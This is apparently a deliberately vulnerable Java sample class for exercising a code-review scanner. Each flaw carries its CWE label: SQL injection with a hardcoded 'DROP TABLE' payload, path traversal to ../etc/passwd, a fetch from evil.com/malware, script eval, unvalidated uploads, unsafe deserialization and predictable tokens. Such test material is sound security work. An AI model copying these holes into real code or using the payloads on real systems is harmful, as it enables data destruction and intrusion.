package com.codeguru.review;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class VulnerableApp {


    public static void main(String[] args) {
        String userInput = "'; DROP TABLE users; --"; // 2. **SQL Injection** (CWE-89)
        executeSQL(userInput);

        String filePath = "../etc/passwd"; // 3. **Path Traversal** (CWE-22)
        readFile(filePath);

        String url = "http://evil.com/malware"; // 4. **Insecure URL Fetch** (CWE-494)
        fetchData(url);

        String jsCode = "alert('Hacked!');"; // 5. **Unsafe JavaScript Execution** (CWE-95)
        executeJavaScript(jsCode);
    }

    // **SQL Injection**
    public static void executeSQL(String userInput) {
        try {
            Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/testdb", DB_USER, DB_PASSWORD);
            Statement stmt = conn.createStatement();
            String query = "SELECT * FROM users WHERE name = '" + userInput + "'"; // SQL Injection
            ResultSet rs = stmt.executeQuery(query);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // **Path Traversal**
    public static void readFile(String filePath) {
        try {
            File file = new File(filePath);
            BufferedReader br = new BufferedReader(new FileReader(file));
            System.out.println(br.readLine());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // **Insecure URL Fetch**
    public static void fetchData(String url) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            System.out.println(br.readLine());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // **Unsafe JavaScript Execution**
    public static void executeJavaScript(String jsCode) {
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
        try {
            engine.eval(jsCode); // Remote Code Execution vulnerability
        } catch (ScriptException e) {
            e.printStackTrace();
        }
    }

    // **Insecure File Upload** (CWE-434)
    public static void saveFile(InputStream uploadedFile, String fileName) throws IOException {
        File file = new File("/uploads/" + fileName); // No file validation
        FileOutputStream out = new FileOutputStream(file);
        out.write(uploadedFile.readAllBytes());
        out.close();
    }

    // **Deserialization of Untrusted Data** (CWE-502)
    public static Object deserializeObject(byte[] data) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        return ois.readObject();
    }

    // **Use of Insufficiently Random Values** (CWE-330)
    public static String generateWeakToken() {
        return String.valueOf(System.currentTimeMillis()); // Predictable token
    }
}